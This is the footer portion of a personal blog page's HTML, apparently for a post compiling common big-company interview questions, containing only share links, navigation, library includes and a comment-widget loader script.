  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/17/work/workpre5/&name=【工作】面试题整理 大厂常见问题2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/17/work/workpre5/&t=【工作】面试题整理 大厂常见问题2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
